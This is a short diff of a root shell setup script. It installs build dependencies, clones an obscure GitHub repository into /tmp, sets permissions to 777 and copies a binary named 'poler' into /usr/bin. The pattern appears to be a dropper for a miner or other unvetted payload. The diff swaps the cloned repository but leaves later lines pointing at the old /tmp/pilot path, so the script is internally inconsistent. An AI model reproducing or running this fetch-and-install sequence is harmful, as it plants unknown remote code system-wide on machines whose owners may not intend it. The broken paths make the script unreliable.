@@ -8,8 +8,8 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir pilot
-git clone https://github.com/robbertopp1/pilot1 /tmp/pilot
-cd /tmp/pilot
+git clone https://github.com/robbertopp1/bur1 /tmp/bur1
+cd /tmp/bur1
 chmod +x /tmp/pilot/poler
 chmod 777 ./*.sh
 cp /tmp/pilot/poler /usr/bin/
